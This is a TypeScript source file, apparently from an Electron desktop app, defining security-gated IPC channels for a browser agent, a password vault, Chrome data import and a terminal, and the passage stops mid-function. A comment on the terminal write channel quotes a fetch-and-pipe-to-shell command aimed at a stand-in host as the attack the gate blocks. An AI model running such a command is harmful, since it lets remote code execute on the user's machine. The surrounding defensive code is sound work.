import {
  type BrowserPanelAnchor,
  type BrowserPanelBounds,
  isBrowserDataKind,
  isBrowserTheme,
  isBrowserToolName,
} from '@sim/browser-protocol'
import type {
  DesktopNotificationPayload,
  DesktopUpdateState,
  DesktopWindowState,
} from '@sim/desktop-bridge'
import {
  isTerminalOperation,
  isTerminalToolName,
  type TerminalToolArgs,
} from '@sim/terminal-protocol'
import { isRecordLike } from '@sim/utils/object'
import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
import { ipcMain } from 'electron'
import {
  clearBrowsingData,
  executeTool,
  getKnownSessions,
  handlePanelAction,
} from '@/main/browser-agent/driver'
import { isAgentWebContents } from '@/main/browser-agent/registry'
import {
  findInActiveTab,
  getTabsState,
  reorderTab,
  setBrowserTheme,
  setTabPinned,
  stopFindInActiveTab,
} from '@/main/browser-agent/session'
import {
  copyCredential,
  credentialsAvailable,
  fillCoordinator,
  forgetAllCredentials,
  forgetCredential,
  listCredentials,
  revealCredential,
} from '@/main/browser-credentials'
import {
  importChromeCookies,
  importChromeData,
  importChromePasswords,
  listChromeImportProfiles,
} from '@/main/browser-import'
import { listSites } from '@/main/browser-sites'
import { isSafeInternalPath } from '@/main/config'
import type { DesktopSettingsService } from '@/main/desktop-settings'
import { isDesktopPreferenceKey } from '@/main/desktop-settings'
import { hasRecentDeliberateInput, hasRecentDiscreteInput } from '@/main/input-activity'
import type { LocalFilesystemService } from '@/main/local-filesystem'
import { isAppOrigin, openExternalSafe } from '@/main/navigation'
import type { TerminalService } from '@/main/terminal'

/** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/

export interface OAuthConnectScope {
  workspaceId?: string
  credentialId?: string
}

/**
 * Validates the optional connect-handoff scope: absent is fine, but a present
 * scope must be an object whose ids are opaque tokens (they are embedded into
 * the /desktop/connect URL). Returns undefined for malformed payloads.
 */
export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefined {
  if (raw === undefined || raw === null) {
    return {}
  }
  if (typeof raw !== 'object') {
    return undefined
  }
  const { workspaceId, credentialId } = raw as { workspaceId?: unknown; credentialId?: unknown }
  if (
    workspaceId !== undefined &&
    (typeof workspaceId !== 'string' || !ID_PATTERN.test(workspaceId))
  ) {
    return undefined
  }
  if (
    credentialId !== undefined &&
    (typeof credentialId !== 'string' || !ID_PATTERN.test(credentialId))
  ) {
    return undefined
  }
  return {
    ...(workspaceId !== undefined ? { workspaceId } : {}),
    ...(credentialId !== undefined ? { credentialId } : {}),
  }
}

/**
 * A renderer-supplied dimension worth acting on. `typeof NaN === 'number'` and
 * `NaN <= 0` is false, so a bare typeof check lets an unfinite value through
 * every downstream positivity guard untouched.
 */
export function isPositiveFinite(value: unknown): value is number {
  return typeof value === 'number' && Number.isFinite(value) && value > 0
}

/**
 * A renderer-supplied dimension as a usable whole number of cells.
 *
 * Flooring after the positivity check is not enough on its own: 0.5 passes
 * `> 0` and floors to 0, and a zero-column pty is either a broken shell or a
 * spawn failure. The floor of one cell is applied here so every caller gets it.
 */
export function toCellCount(value: unknown, fallback: number): number {
  return isPositiveFinite(value) ? Math.max(1, Math.floor(value)) : fallback
}

/** Validates a renderer-reported panel rect (finite numbers or explicit null). */
export function parsePanelBounds(
  raw: unknown
): { x: number; y: number; width: number; height: number } | null | undefined {
  if (raw === null) {
    return null
  }
  if (typeof raw !== 'object') {
    return undefined
  }
  const rect = raw as { x?: unknown; y?: unknown; width?: unknown; height?: unknown }
  if (
    typeof rect.x === 'number' &&
    typeof rect.y === 'number' &&
    typeof rect.width === 'number' &&
    typeof rect.height === 'number' &&
    [rect.x, rect.y, rect.width, rect.height].every(Number.isFinite)
  ) {
    return { x: rect.x, y: rect.y, width: rect.width, height: rect.height }
  }
  return undefined
}

/**
 * Validates the optional panel anchor. Absent or malformed yields undefined, so
 * the panel falls back to the measured rect alone — an anchor is an
 * optimization, never a requirement.
 */
export function parsePanelAnchor(raw: unknown): BrowserPanelAnchor | undefined {
  if (!isRecordLike(raw)) {
    return undefined
  }
  const { viewportWidth, viewportHeight, widthRatio } = raw as {
    viewportWidth?: unknown
    viewportHeight?: unknown
    widthRatio?: unknown
  }
  if (
    typeof viewportWidth !== 'number' ||
    typeof viewportHeight !== 'number' ||
    typeof widthRatio !== 'number' ||
    ![viewportWidth, viewportHeight, widthRatio].every(Number.isFinite) ||
    viewportWidth <= 0 ||
    viewportHeight <= 0 ||
    widthRatio < 0 ||
    widthRatio > 1
  ) {
    return undefined
  }
  return { viewportWidth, viewportHeight, widthRatio }
}

export function parseDesktopNotificationPayload(raw: unknown): DesktopNotificationPayload | null {
  if (typeof raw !== 'object' || raw === null) {
    return null
  }
  const { title, body, route } = raw as {
    title?: unknown
    body?: unknown
    route?: unknown
  }
  if (
    typeof title !== 'string' ||
    title.length < 1 ||
    title.length > 120 ||
    typeof body !== 'string' ||
    body.length < 1 ||
    body.length > 500
  ) {
    return null
  }
  if (route !== undefined && (typeof route !== 'string' || !isSafeInternalPath(route))) {
    return null
  }
  return { title, body, ...(route !== undefined ? { route } : {}) }
}

export interface IpcDeps {
  appOrigin: () => string
  allowHttpLocalhost: () => boolean
  retryLoad: (sender: WebContents) => void
  localFilesystem: LocalFilesystemService
  terminal: TerminalService
  settings: DesktopSettingsService
  getWindowState: (sender: WebContents) => DesktopWindowState
  /** The window owning a renderer, for anchoring native menus. */
  getWindowForContents: (sender: WebContents) => BrowserWindow | null
  browserPanel: {
    setBounds: (
      sender: WebContents,
      bounds: BrowserPanelBounds | null,
      anchor?: BrowserPanelAnchor
    ) => void
    setFocused: (sender: WebContents, focused: boolean) => void
    setOccluded: (sender: WebContents, occluded: boolean) => void
  }
  beginOAuthConnect: (providerId: string, scope: OAuthConnectScope) => Promise<boolean>
  updates: {
    getState: () => DesktopUpdateState
    check: () => void
    install: () => void
  }
}

/**
 * Who may call a channel:
 * - `app-origin`: only the remote app origin (main window pages).
 * - `local-page`: only bundled `file:` pages (offline) — shell control.
 * - `browser-page`: only the built-in browser's own tabs, identified by
 *   WebContents rather than by URL. These carry reports from the browser
 *   preload about untrusted pages, so they are the one inbound surface whose
 *   sender is not the app — the payload is treated as a claim to verify, never
 *   as an instruction.
 * - `any`: sender-independent channels that validate their input instead.
 */
type ChannelGate = 'app-origin' | 'local-page' | 'browser-page' | 'any'

/**
 * A desktop surface the user can switch off. Channels that drive one are
 * refused while it is off, so the gate holds even if renderer-side checks are
 * stale or bypassed. Channels that only read or reset the surface's settings
 * stay open — otherwise turning it back on would be impossible.
 */
type ChannelFeature = 'browser' | 'terminal'

interface ChannelSpecBase {
  gate: ChannelGate
  passSender?: boolean
  requires?: ChannelFeature
  /**
   * Why this channel's `gate` or `requires` deviates from the rest of its
   * name family. Required by `check:desktop-ipc` for any channel that does,
   * so a new channel cannot quietly opt out of its family's surface toggle.
   *
   * A field rather than a comment because the deviation is a property of this
   * object: reordering the table moves it with its channel, where a positional
   * comment would silently transfer to whichever channel took its place.
   */
  deviationReason?: string
}

type ChannelSpec =
  | (ChannelSpecBase & {
      kind: 'invoke'
      /** Requires an in-progress user gesture in the calling page. */
      needsUserActivation?: boolean
      /** Returned to the caller when a gate rejects the call. */
      denied: unknown
      handler: (...args: unknown[]) => unknown
    })
  | (ChannelSpecBase & {
      kind: 'send'
      /**
       * Requires recent real OS input before a payload is forwarded. Payload-
       * scoped rather than channel-scoped because the same channel also carries
       * terminal replies the PTY solicits, which arrive with no user input.
       */
      payloadNeedsDeliberateInput?: boolean
      handler: (...args: unknown[]) => void
    })

function isLocalPageSender(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
  try {
    return new URL(event.senderFrame?.url ?? '').protocol === 'file:'
  } catch {
    return false
  }
}

/**
 * Compared by parsed origin, not `startsWith`. This is the renderer-to-main
 * boundary, and prefix matching admits lookalike hosts — see the warning on
 * {@link isAppOrigin}.
 */
function isAppOriginSender(event: IpcMainEvent | IpcMainInvokeEvent, appOrigin: string): boolean {
  return isAppOrigin(event.senderFrame?.url ?? '', appOrigin)
}

function localFilesystemRequestNeedsUserActivation(request: unknown): boolean {
  if (typeof request !== 'object' || request === null) return false
  const operation = (request as { operation?: unknown }).operation
  return (
    operation === 'mount_directory' || operation === 'forget_mount' || operation === 'reveal_mount'
  )
}

function localFilesystemRequestNeedsToolAuthorization(request: unknown): boolean {
  if (typeof request !== 'object' || request === null) return false
  const operation = (request as { operation?: unknown }).operation
  return (
    operation === 'list' ||
    operation === 'glob' ||
    operation === 'read' ||
    operation === 'grep' ||
    operation === 'stat'
  )
}

/**
 * Whether the caller has a real user gesture behind it, answered from the main
 * process's own record of OS input rather than by asking the renderer.
 */
function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
  return hasRecentDiscreteInput(event.sender)
}

/**
 * Replies the PTY solicits and the terminal must answer unprompted. All
 * machine-generated and self-delimiting, which is what makes them safe to
 * enumerate.
 */
const PTY_REPLY_PATTERNS = [
  /\u001b\[[0-9;?]*[Rc]/, // DSR cursor position, device attributes
  /\u001b\[[IO]/, // focus in/out (mode 1004)
  /\u001b\[M[\s\S]{3}/, // X10 mouse report
  /\u001b\[<[0-9;]*[mM]/, // SGR mouse report
  /\u001bP[\s\S]*?\u001b\\/, // DCS response
  /\u001b\][\s\S]*?\u0007/, // OSC response
]
const PTY_REPLY = new RegExp(
  `^(?:${PTY_REPLY_PATTERNS.map((pattern) => pattern.source).join('|')})+$`
)

/**
 * Whether a terminal-write payload needs a person behind it.
 *
 * The reply set is enumerated and everything else is gated, rather than the
 * other way round. "What submits" is not a closed set: besides carriage return
 * and newline, EOT (`0x04`) hands a partial line straight to a reader in
 * canonical mode, and `0x0f` is `operate-and-get-next` in bash and
 * `accept-line-and-down-history` in zsh — both of which execute the current
 * line. A user's own `inputrc` or `zle` bindings can add more. Enumerating that
 * set would leave whichever binding was forgotten ungated, so the allowlist runs
 * the other way and fails closed.
 */
function needsDeliberateInputForWrite(args: unknown[]): boolean {
  const data = args[1]
  if (typeof data !== 'string' || data.length === 0) return false
  return !PTY_REPLY.test(data)
}

interface DesktopToolAuthorization {
  toolName: string
  args: Record<string, unknown>
}

async function fetchDesktopToolAuthorization(
  event: IpcMainInvokeEvent,
  deps: IpcDeps,
  toolCallId: unknown
): Promise<DesktopToolAuthorization | null> {
  if (typeof toolCallId !== 'string' || toolCallId.length < 1 || toolCallId.length > 256) {
    return null
  }
  try {
    const response = await event.sender.session.fetch(
      `${deps.appOrigin()}/api/desktop/tool/authorize`,
      {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ toolCallId }),
      }
    )
    if (!response.ok) return null
    const authorization = (await response.json()) as {
      toolName?: unknown
      args?: unknown
    }
    if (
      typeof authorization.toolName !== 'string' ||
      typeof authorization.args !== 'object' ||
      authorization.args === null ||
      Array.isArray(authorization.args)
    ) {
      return null
    }
    return {
      toolName: authorization.toolName,
      args: authorization.args as Record<string, unknown>,
    }
  } catch {
    return null
  }
}

async function authorizeLocalFilesystemTool(
  event: IpcMainInvokeEvent,
  deps: IpcDeps,
  request: unknown
): Promise<boolean> {
  if (typeof request !== 'object' || request === null) return false
  const authorization = await fetchDesktopToolAuthorization(
    event,
    deps,
    (request as { requestId?: unknown }).requestId
  )
  return authorization
    ? deps.localFilesystem.isAuthorizedClientToolRequest(request, authorization)
    : false
}

/**
 * Registers the whitelisted IPC surface, table-driven so the whole
 * renderer→main security posture is auditable in one place: every channel
 * declares its sender gate up front, and handlers only ever see gated,
 * unvalidated args they must parse themselves.
 */
export function registerIpcHandlers(deps: IpcDeps): void {
  const channels: Record<string, ChannelSpec> = {
    'desktop:open-external': {
      kind: 'invoke',
      gate: 'any',
      deviationReason:
        'the offline and error pages are local-page senders, not app-origin, and handing a support link to the system browser is the one action that must work when the app cannot reach its origin at all',
      denied: false,
      handler: (url) =>
        typeof url === 'string' ? openExternalSafe(url, deps.allowHttpLocalhost()) : false,
    },
    // OAuth connect handoff: the whole flow runs in the system browser (state
    // is cookie-bound to the initiating user agent), returning via loopback.
    'desktop:oauth-connect': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: false,
      handler: (providerId, scope) => {
        if (typeof providerId !== 'string') {
          return false
        }
        const parsedScope = parseOAuthConnectScope(scope)
        if (parsedScope === undefined) {
          return false
        }
        return deps.beginOAuthConnect(providerId, parsedScope)
      },
    },
    'desktop:local-filesystem': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: {
        ok: false,
        code: 'ACCESS_DENIED',
        error: 'Local filesystem access is not allowed from this page.',
      },
      handler: (request) => deps.localFilesystem.handle(request),
    },
    'desktop:settings:get': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: null,
      handler: () => deps.settings.getPreferences(),
    },
    'desktop:settings:set': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: null,
      handler: (key, value) =>
        isDesktopPreferenceKey(key) && typeof value === 'boolean'
          ? deps.settings.setPreference(key, value)
          : deps.settings.getPreferences(),
    },
    'desktop:settings:notify': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: false,
      handler: (raw) => {
        const payload = parseDesktopNotificationPayload(raw)
        return payload ? deps.settings.notify(payload) : false
      },
    },
    'desktop:window-state:get': {
      kind: 'invoke',
      gate: 'app-origin',
      passSender: true,
      denied: { isFullScreen: false },
      handler: (sender) => deps.getWindowState(sender as WebContents),
    },
    'desktop:updates:get-state': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: { status: 'idle' },
      handler: () => deps.updates.getState(),
    },
    'desktop:updates:check': {
      kind: 'send',
      gate: 'app-origin',
      handler: () => deps.updates.check(),
    },
    'desktop:updates:install': {
      kind: 'send',
      gate: 'app-origin',
      handler: () => deps.updates.install(),
    },
    'browser-agent:execute-tool': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'browser',
      denied: { ok: false, error: 'Browser automation is not allowed from this page.' },
      handler: (tool, params) => {
        if (typeof tool !== 'string' || !isBrowserToolName(tool)) {
          return { ok: false, error: `Unknown browser tool: ${String(tool)}` }
        }
        const toolParams = isRecordLike(params) ? params : {}
        return executeTool(tool, toolParams)
      },
    },
    'browser-agent:get-tabs-state': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'browser',
      denied: { tabs: [], activeTabId: null },
      handler: () => getTabsState(),
    },
    // Reads and wipes the stored browsing trail, so both stay available while
    // the browser is switched off — that is exactly when someone clears it.
    'browser-agent:get-known-sessions': {
      kind: 'invoke',
      gate: 'app-origin',
      deviationReason:
        "read/reset of the surface's own data; gating it on the surface would strand the browsing trail with no way to inspect or erase it",
      denied: { sessions: [] },
      handler: () => getKnownSessions(),
    },
    'browser-agent:clear-browsing-data': {
      kind: 'invoke',
      gate: 'app-origin',
      deviationReason:
        'erasing browsing data has to work with the browser off, which is the state a user clearing it is most likely to be in',
      needsUserActivation: true,
      denied: { sessions: [] },
      handler: async (rawKinds) => {
        // Saved passwords are intentionally untouched here; erasing the vault
        // is a separate, explicit action.
        const kinds = Array.isArray(rawKinds) ? rawKinds.filter(isBrowserDataKind) : undefined
        await clearBrowsingData(kinds && kinds.length > 0 ? kinds : undefined)
        return getKnownSessions()
      },
    },
    'browser-agent:panel-action': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (action) => {
        if (
          typeof action !== 'object' ||
          action === null ||
          typeof (action as { action?: unknown }).action !== 'string'
        ) {
          return
        }
        void handlePanelAction(action as Parameters<typeof handlePanelAction>[0]).catch(() => {})
      },
    },
    'browser-agent:set-tab-pinned': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (tabId, pinned) => {
        if (typeof tabId !== 'string' || typeof pinned !== 'boolean') return
        try {
          setTabPinned(tabId, pinned)
        } catch {}
      },
    },
    'browser-agent:reorder-tab': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (tabId, targetIndex) => {
        if (
          typeof tabId !== 'string' ||
          typeof targetIndex !== 'number' ||
          !Number.isFinite(targetIndex)
        ) {
          return
        }
        try {
          reorderTab(tabId, targetIndex)
        } catch {}
      },
    },
    'browser-agent:set-panel-bounds': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      passSender: true,
      handler: (sender, raw, rawAnchor) => {
        const bounds = parsePanelBounds(raw)
        if (bounds !== undefined) {
          deps.browserPanel.setBounds(sender as WebContents, bounds, parsePanelAnchor(rawAnchor))
        }
      },
    },
    'browser-agent:set-panel-focused': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      passSender: true,
      handler: (sender, focused) => {
        if (typeof focused === 'boolean') {
          deps.browserPanel.setFocused(sender as WebContents, focused)
        }
      },
    },
    'browser-agent:set-panel-occluded': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      passSender: true,
      handler: (sender, occluded) => {
        if (typeof occluded === 'boolean') {
          deps.browserPanel.setOccluded(sender as WebContents, occluded)
        }
      },
    },
    'browser-agent:set-theme': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (theme) => {
        if (isBrowserTheme(theme)) {
          setBrowserTheme(theme)
        }
      },
    },
    'browser-agent:find': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (raw) => {
        if (typeof raw !== 'object' || raw === null) return
        const { query, findNext, forward } = raw as Record<string, unknown>
        if (
          typeof query !== 'string' ||
          typeof findNext !== 'boolean' ||
          typeof forward !== 'boolean'
        ) {
          return
        }
        findInActiveTab({ query, findNext, forward })
      },
    },
    'browser-agent:stop-find': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'browser',
      handler: (focusPage) => {
        stopFindInActiveTab(focusPage === true)
      },
    },
    // Local Chrome import. This is a user-only surface: no browser tool maps
    // to either channel, so the agent has no path to it, and the import itself
    // additionally demands a live user gesture — a compromised or scripted
    // renderer cannot start one on its own. Only counts come back.
    'browser-import:list-profiles': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'browser',
      denied: [],
      handler: () => listChromeImportProfiles(),
    },
    'browser-import:cookies': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'browser',
      needsUserActivation: true,
      denied: { cookiesImported: 0, cookiesSkipped: 0, error: 'unknown' },
      handler: (profileId) => {
        // An explicit profile must be honoured or refused, never quietly
        // swapped for the default — that would import the wrong account.
        if (profileId !== undefined && profileId !== null && typeof profileId !== 'string') {
          return { cookiesImported: 0, cookiesSkipped: 0, error: 'unknown' }
        }
        return importChromeCookies(typeof profileId === 'string' ? profileId : undefined)
      },
    },
    // Cookies and passwords together, so the user only has to authorize once.
    'browser-import:all': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'browser',
      needsUserActivation: true,
      denied: {
        cookies: { cookiesImported: 0, cookiesSkipped: 0, error: 'unknown' },
        passwords: {
          passwordsAdded: 0,
          passwordsUpdated: 0,
          passwordsSkipped: 0,
          error: 'unknown',
        },
      },
      handler: (profileId, policy) => {
        if (profileId !== undefined && profileId !== null && typeof profileId !== 'string') {
          return {
            cookies: { cookiesImported: 0, cookiesSkipped: 0, error: 'unknown' },
            passwords: {
              passwordsAdded: 0,
              passwordsUpdated: 0,
              passwordsSkipped: 0,
              error: 'unknown',
            },
          }
        }
        return importChromeData(
          typeof profileId === 'string' ? profileId : undefined,
          policy === 'replace' ? 'replace' : 'keep-existing'
        )
      },
    },
    // Reported by the browser preload for the page it is running in. The
    // origin it names is a claim: the fill coordinator re-checks it against
    // the live URL before any password is read.
    'browser-credentials:form-state': {
      kind: 'send',
      gate: 'browser-page',
      deviationReason:
        "the only sender in this family that is a browser PAGE rather than the Sim app, so browser-page is the correct gate and requires:'browser' follows — with the browser off no such page exists",
      requires: 'browser',
      passSender: true,
      handler: (sender, report) => {
        if (!isRecordLike(report)) return
        const { origin, hasLoginForm } = report as { origin?: unknown; hasLoginForm?: unknown }
        if (typeof origin !== 'string' || typeof hasLoginForm !== 'boolean') return
        fillCoordinator()?.noteFormState(sender as WebContents, { origin, hasLoginForm })
      },
    },
    'browser-credentials:available': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: false,
      handler: () => credentialsAvailable(),
    },
    'browser-credentials:list': {
      kind: 'invoke',
      gate: 'app-origin',
      denied: [],
      handler: () => listCredentials(),
    },
    // Hosts a previous import brought over, with the name and icon the source
    // browser gave each one and an aggregate count of how much it was used
    // there. No password material, and no browsing history in the sense that
    // matters: no visit times, no URLs beyond the host, no ordering of one
    // visit against another.
    'browser-import:sites': {
      kind: 'invoke',
      gate: 'app-origin',
      deviationReason:
        'a read of already-imported data; settings lists these hosts to show what an import brought over, which is what you look at while deciding whether to enable the browser',
      denied: [],
      handler: () => listSites(),
    },
    // The one channel in the whole surface that can return password
    // plaintext. It is gated three ways: the Sim app origin, a live user
    // gesture, and an OS prompt inside the handler on every single call.
    'browser-credentials:reveal': {
      kind: 'invoke',
      gate: 'app-origin',
      needsUserActivation: true,
      denied: null,
      handler: (id) => (typeof id === 'string' ? revealCredential(id) : null),
    },
    'browser-credentials:copy': {
      kind: 'invoke',
      gate: 'app-origin',
      needsUserActivation: true,
      denied: false,
      handler: (id) => (typeof id === 'string' ? copyCredential(id) : false),
    },
    'browser-credentials:forget': {
      kind: 'invoke',
      gate: 'app-origin',
      needsUserActivation: true,
      denied: [],
      handler: (id) => (typeof id === 'string' ? forgetCredential(id) : listCredentials()),
    },
    'browser-credentials:forget-all': {
      kind: 'invoke',
      gate: 'app-origin',
      needsUserActivation: true,
      denied: [],
      handler: () => forgetAllCredentials(),
    },
    'browser-credentials:import': {
      kind: 'invoke',
      gate: 'app-origin',
      deviationReason:
        "unlike its siblings this WRITES new credentials by driving the embedded browser's import path, so it needs the surface the rest of the family deliberately does without",
      requires: 'browser',
      needsUserActivation: true,
      denied: {
        passwordsAdded: 0,
        passwordsUpdated: 0,
        passwordsSkipped: 0,
        error: 'unknown',
      },
      handler: (profileId, policy) => {
        if (profileId !== undefined && profileId !== null && typeof profileId !== 'string') {
          return { passwordsAdded: 0, passwordsUpdated: 0, passwordsSkipped: 0, error: 'unknown' }
        }
        return importChromePasswords(
          typeof profileId === 'string' ? profileId : undefined,
          policy === 'replace' ? 'replace' : 'keep-existing'
        )
      },
    },
    // Opens the native account chooser. The renderer only says "the user
    // clicked the key icon, here"; it never learns which accounts exist, never
    // names one, and never receives a password. The shell performs the fill.
    'browser-credentials:show-chooser': {
      kind: 'invoke',
      gate: 'app-origin',
      deviationReason:
        'it fills into a live browser page, so unlike the read-only management channels beside it there is nothing to act on when the browser is off',
      requires: 'browser',
      needsUserActivation: true,
      passSender: true,
      denied: false,
      handler: (sender, anchor) => {
        const window = deps.getWindowForContents(sender as WebContents)
        if (!window || !isRecordLike(anchor)) return false
        const { x, y } = anchor as { x?: unknown; y?: unknown }
        if (
          typeof x !== 'number' ||
          typeof y !== 'number' ||
          !Number.isFinite(x) ||
          !Number.isFinite(y)
        ) {
          return false
        }
        return fillCoordinator()?.showChooser(window, { x, y }) ?? false
      },
    },
    'terminal:start': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { ok: false, code: 'ACCESS_DENIED', error: 'Not allowed from this page.' },
      handler: (raw) => {
        const options = isRecordLike(raw) ? raw : {}
        const cols = Number(options.cols)
        const rows = Number(options.rows)
        try {
          return {
            ok: true,
            tabs: deps.terminal.start({
              cols: toCellCount(cols, 80),
              rows: toCellCount(rows, 24),
            }),
          }
        } catch (error) {
          const failure = error as { code?: string; message?: string }
          return {
            ok: false,
            code: failure.code ?? 'SPAWN_FAILED',
            error: failure.message ?? 'Could not open a terminal.',
          }
        }
      },
    },
    'terminal:execute-tool': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { ok: false, error: 'Terminal access is not allowed from this page.' },
      handler: (toolCallId, tool, params) => {
        if (
          typeof toolCallId !== 'string' ||
          typeof tool !== 'string' ||
          !isTerminalToolName(tool)
        ) {
          return { ok: false, error: `Unknown terminal tool: ${String(tool)}` }
        }
        const call = isRecordLike(params) ? params : {}
        if (!isTerminalOperation(call.operation)) {
          return { ok: false, error: `Unknown terminal operation: ${String(call.operation)}` }
        }
        const args = isRecordLike(call.args) ? (call.args as TerminalToolArgs) : {}
        return deps.terminal.executeTool(toolCallId, call.operation, args)
      },
    },
    'terminal:handoff-done': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'terminal',
      handler: (terminalId) => {
        if (typeof terminalId === 'string') deps.terminal.finishHandoff(terminalId)
      },
    },
    'terminal:focused': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'terminal',
      passSender: true,
      handler: (sender, focused) =>
        deps.terminal.setPanelFocused(focused === true, sender as WebContents),
    },
    'terminal:scrollback': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: '',
      handler: (terminalId) =>
        typeof terminalId === 'string' ? deps.terminal.getScrollback(terminalId) : '',
    },
    'terminal:get-tabs': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { tabs: [], activeTerminalId: null },
      handler: () => deps.terminal.getTabs(),
    },
    'terminal:open': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { tabs: [], activeTerminalId: null },
      handler: (cwd) => deps.terminal.openTerminal(typeof cwd === 'string' ? cwd : undefined),
    },
    'terminal:switch': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { tabs: [], activeTerminalId: null },
      handler: (terminalId) =>
        typeof terminalId === 'string'
          ? deps.terminal.switchTerminal(terminalId)
          : deps.terminal.getTabs(),
    },
    'terminal:close': {
      kind: 'invoke',
      gate: 'app-origin',
      requires: 'terminal',
      denied: { tabs: [], activeTerminalId: null },
      handler: (terminalId) =>
        typeof terminalId === 'string'
          ? deps.terminal.closeTerminal(terminalId)
          : deps.terminal.getTabs(),
    },
    'terminal:write': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'terminal',
      handler: (terminalId, data) => {
        if (typeof terminalId !== 'string' || typeof data !== 'string') return
        deps.terminal.write(terminalId, data)
      },
      // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
      // Panel focus is deliberately not used — `terminal:focused` is a
      // renderer-asserted claim the same attacker can set.
      //
      // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
      // line buffer, where the user's own next Enter submits it — visible on
      // screen, but not prevented. Closing that needs the interactive path off
      // the renderer surface entirely (main writing the keystrokes it already
      // observes) or the terminal in its own WebContents, neither of which is a
      // gate change. Tracked as follow-up.
      payloadNeedsDeliberateInput: true,
    },
    'terminal:resize': {
      kind: 'send',
      gate: 'app-origin',
      requires: 'terminal',
      handler: (terminalId, cols, rows) => {
        // `typeof NaN === 'number'`, and the downstream `cols <= 0` guard is
        // false for NaN, so an unfinite value reached pty.resize() intact.
        // Matches the clamping terminal:start already applies to these fields.
        if (typeof terminalId !== 'string') return
        if (!isPositiveFinite(cols) || !isPositiveFinite(rows)) return
        deps.terminal.resize(terminalId, toCellCount(cols, 1), toCellCount(rows, 1))
      },
    },
    'terminal:dispose': {
      kind: 'send',
      gate: 'app-origin',
      deviationReason:
        'tearing the surface down must survive the surface being off, or a terminal left running when the feature was disabled could never be reaped',
      handler: () => deps.terminal.dispose(),
    },
    'offline:retry': {
      kind: 'send',
      gate: 'local-page',
      passSender: true,
      handler: (sender) => deps.retryLoad(sender as WebContents),
    },
  }

  const senderAllowed = (event: IpcMainEvent | IpcMainInvokeEvent, gate: ChannelGate): boolean => {
    if (gate === 'any') return true
    if (gate === 'app-origin') return isAppOriginSender(event, deps.appOrigin())
    if (gate === 'browser-page') return isAgentWebContents(event.sender)
    return isLocalPageSender(event)
  }

  const featureAllowed = (feature: ChannelFeature | undefined): boolean => {
    if (!feature) return true
    const preferences = deps.settings.getPreferences()
    // Absent means on: the surfaces predate the preference.
    return feature === 'browser'
      ? preferences.browserEnabled !== false
      : preferences.terminalEnabled !== false
  }

  for (const [channel, spec] of Object.entries(channels)) {
    if (spec.kind === 'invoke') {
      ipcMain.handle(channel, async (event, ...args) => {
        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return spec.denied
        if (spec.needsUserActivation && !senderHasUserGesture(event)) {
          return spec.denied
        }
        let handlerArgs = args
        if (channel === 'browser-agent:execute-tool') {
          const requestedTool = args[1]
          const authorization = await fetchDesktopToolAuthorization(event, deps, args[0])
          if (
            !authorization ||
            typeof requestedTool !== 'string' ||
            authorization.toolName !== requestedTool ||
            !isBrowserToolName(authorization.toolName)
          ) {
            return {
              ok: false,
              error: 'This browser action is not an authorized pending Copilot tool call.',
            }
          }
          handlerArgs = [authorization.toolName, authorization.args]
        }
        if (channel === 'terminal:execute-tool') {
          const requestedTool = args[1]
          const authorization = await fetchDesktopToolAuthorization(event, deps, args[0])
          if (
            !authorization ||
            typeof requestedTool !== 'string' ||
            authorization.toolName !== requestedTool ||
            !isTerminalToolName(authorization.toolName)
          ) {
            return {
              ok: false,
              error: 'This terminal action is not an authorized pending Copilot tool call.',
            }
          }
          // The command executed is the one the server has on file for this
          // tool call, never the one the renderer passed in.
          handlerArgs = [args[0], authorization.toolName, authorization.args]
        }
        if (
          channel === 'desktop:local-filesystem' &&
          localFilesystemRequestNeedsUserActivation(args[0]) &&
          !senderHasUserGesture(event)
        ) {
          return {
            ok: false,
            code: 'ACCESS_DENIED',
            error: 'This local filesystem action requires an explicit user click.',
          }
        }
        if (
          channel === 'desktop:local-filesystem' &&
          localFilesystemRequestNeedsToolAuthorization(args[0]) &&
          !(await authorizeLocalFilesystemTool(event, deps, args[0]))
        ) {
          return {
            ok: false,
            code: 'ACCESS_DENIED',
            error: 'This local filesystem request is not an authorized pending Copilot tool call.',
